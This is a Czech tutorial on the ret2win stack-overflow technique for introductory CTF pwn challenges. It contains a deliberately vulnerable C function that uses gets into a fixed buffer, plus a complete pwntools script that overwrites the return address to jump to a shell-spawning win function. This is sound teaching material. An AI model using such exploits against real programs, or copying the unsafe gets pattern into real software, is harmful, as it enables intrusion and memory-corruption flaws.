# Return 2 Win

## Co je ret2win?

`ret2win` je jedna z technik binary exploitation. Princip je jednoduchý: přepíšeme návratovou adresu tak, aby program po vykonání instrukce `ret` skočil do již existující funkce, která pro nás udělá „výherní“ akci.

Typicky jde o funkci jako:

- `win`
- `print_flag`
- `get_shell`

Tato technika je velmi častá v úvodních CTF `pwn` úlohách, protože dobře ukazuje základní princip ovládnutí toku programu.

### Myšlenka útoku

Pokud máme stack overflow a známe správný offset k návratové adrese, můžeme payload sestavit takto:

```python
payload = b"A" * stack_offset + p64(win_addr)
```

Význam jednotlivých částí:

- `b"A" * stack_offset` vyplní buffer až k návratové adrese
- `p64(win_addr)` zapíše novou 64bitovou adresu, na kterou se má program vrátit

Po návratu z funkce tedy program neskočí zpět do původního místa, ale do funkce `win`.

V této kapitole zatím **neřešíme PIE**, takže adresy funkcí bereme přímo z ELF souboru.

## Příklad

Máme binárku, která obsahuje zranitelnou funkci a zároveň někde vevnitř existuje funkce `win`:

```c
void win() {
    system("/bin/sh");
}

void vuln() {
    char buffer[64];
    gets(buffer);
}
```

Pokud `gets` umožní přepsat návratovou adresu, stačí program donutit vrátit se do `win`.

### Nalezení adresy funkce

Pomocí pwntools lze načíst binárku jako ELF objekt:

```python
from pwn import *

elf = ELF("./binary")
print(hex(elf.symbols["win"]))
```

Tím získáme adresu funkce `win` přímo ze symbolů ELF souboru.

Taktéž lze využít decompiler či debugger.

```bash
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x1000  _init
0x1090  __cxa_finalize@plt
0x10a0  puts@plt
0x10b0  __stack_chk_fail@plt
0x10c0  printf@plt
0x10d0  close@plt
0x10e0  read@plt
0x10f0  open@plt
0x1100  _start
0x1130  deregister_tm_clones
0x1160  register_tm_clones
0x11a0  __do_global_dtors_aux
0x11e0  frame_dummy
0x11e9  main
0x12a8  win
```

## Sestavení payloadu

Po nalezení offsetu a adresy funkce sestavíme payload přesně v tomto tvaru:

```python
stack_offset = 72

payload = b"A" * stack_offset + p64(elf.symbols["win"])
```

To je základ celé techniky `ret2win`.

### Kompletní payload

```python
from pwn import *

elf = ELF("./binary")
io = process("./binary")

stack_offset = 72
payload = b"A" * stack_offset + p64(elf.symbols["win"])

io.sendline(payload)
io.interactive()
```

Tento exploit:

- spustí proces
- vytvoří správný payload
- pošle jej programu
- přepne se do interaktivního režimu

Pokud funkce `win` například spouští shell, získáme interaktivní shell. Pokud pouze vypisuje flag, uvidíme jej na výstupu.